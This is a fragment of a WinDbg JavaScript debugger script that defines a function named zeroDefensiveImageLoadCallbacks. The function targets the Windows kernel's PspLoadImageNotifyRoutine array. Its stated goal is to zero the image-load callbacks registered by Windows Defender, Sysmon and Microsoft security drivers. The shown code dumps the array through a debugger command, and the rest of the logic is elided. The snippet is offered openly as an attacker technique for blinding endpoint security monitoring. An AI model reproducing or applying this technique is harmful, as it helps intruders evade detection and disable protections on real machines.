...
function zeroDefensiveImageLoadCallbacks() {
    const log = x => host.diagnostics.debugLog(x + "\n");
    const ctl = host.namespace.Debugger.Utility.Control;

    const targets = ["WdFilter", "SysmonDrv", "mssecflt"];

    log("[*] PspLoadImageNotifyRoutine - Zeroing defensive callbacks\n");

    let results = ctl.ExecuteCommand("dqs nt!PspLoadImageNotifyRoutine L50");
...
function initializeScript() {
    return [
        new host.functionAlias(zeroDefensiveImageLoadCallbacks, "zeroDefensiveImageLoadCallbacks")
    ];
}
